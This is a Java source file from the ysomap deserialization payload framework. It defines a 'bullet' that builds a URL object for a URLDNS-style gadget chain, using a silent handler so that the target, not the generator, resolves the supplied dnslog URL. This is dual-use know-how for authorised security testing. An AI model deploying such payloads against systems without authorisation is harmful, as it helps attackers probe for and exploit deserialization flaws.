package ysomap.core.gadget.bullet.jdk;

import ysomap.annotation.Bullets;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;

/**
 * @author wh1t3P1g
 * @since 2020/2/23
 */
@Bullets
public class URLBullet extends Bullet<URL> {

    @Require(name = "url", detail = "set a dnslog url")
    private String url;

    @Override
    public URL getObject() throws Exception {
        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();
        return new URL(null, url, handler); // URL to use as the Key
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
